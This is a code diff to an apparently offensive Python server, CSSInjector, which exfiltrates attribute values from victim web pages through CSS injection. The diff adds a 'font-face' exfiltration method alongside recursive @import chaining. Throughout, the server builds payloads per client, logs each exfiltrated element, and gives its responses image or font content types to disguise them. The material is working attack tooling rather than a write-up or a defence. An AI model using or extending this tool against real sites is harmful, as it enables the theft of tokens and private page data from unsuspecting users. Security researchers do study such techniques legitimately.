@@ -16,11 +16,10 @@ class CSSInjector:
         self.element = args.element
         self.attribut = args.attribut
         self.show_details = args.details
-
+        self.method = args.method
         self.app = web.Application()
         self.app.middlewares.append(self.dynamic_router_middleware)
         self.console = Console()
-
         web.run_app(
             self.app,
             port=self.port,
@@ -44,11 +43,22 @@ class CSSInjector:
         if self.show_details:
             for key, value in request.headers.items():
                 self.console.log("connection_details", f"{key} : {value}")
-
-        return web.Response(
-            text=injection.generate_next_import(self.hostname, self.port, client),
-            content_type="text/css",
-        )
+        if self.method == "recursive":
+            return web.Response(
+                text=injection.generate_next_import(self.hostname, self.port, client),
+                content_type="text/css",
+            )
+        elif self.method == "font-face":
+            return web.Response(
+                text=injection.generate_payload_font_face(
+                    hostname=self.hostname,
+                    port=self.port,
+                    attribut=self.attribut,
+                    element=self.element,
+                    client=client,
+                ),
+                content_type="text/css",
+            )
 
     async def handle_end(self, request):
         client_id = request.query.get("client_id")
@@ -82,7 +92,7 @@ class CSSInjector:
         client.event.clear()
 
         return web.Response(
-            text=injection.generate_payload(
+            text=injection.generate_payload_recursive_import(
                 hostname=self.hostname,
                 port=self.port,
                 element=self.element,
@@ -105,7 +115,10 @@ class CSSInjector:
                 "exfiltration",
                 f"[{client.id}] - Exfiltrating element {len(client.elements)} : {client.data}",
             )
-        return web.Response(text="ok.", content_type="image/x-icon")
+        if self.method == "recursive":
+            return web.Response(text="ok.", content_type="image/x-icon")
+        elif self.method == "font-face":
+            return web.Response(text="ok.", content_type="application/x-font-ttf")
 
     async def dynamic_router_middleware(self, app, handler):
         async def middleware_handler(request):
